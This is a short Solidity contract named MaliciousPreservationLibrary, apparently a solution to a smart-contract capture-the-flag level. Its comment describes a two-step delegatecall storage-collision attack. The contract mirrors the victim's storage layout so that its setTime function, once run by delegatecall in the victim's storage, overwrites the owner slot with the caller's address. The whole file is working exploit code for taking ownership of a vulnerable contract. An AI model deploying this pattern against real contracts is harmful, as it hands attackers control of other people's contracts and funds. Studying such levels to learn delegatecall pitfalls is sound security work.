pragma solidity ^0.8.0;
contract MaliciousPreservationLibrary {

    // Our goals: after swapping the first time zone delegatecall, 
    // call the 2nd time with this as library address to swap the stored owner in storage slot 2

    address private timeZone1Library;
    address private timeZone2Library;
    address private owner;

    function setTime(uint256 _now) public {
        owner = msg.sender;
    }
}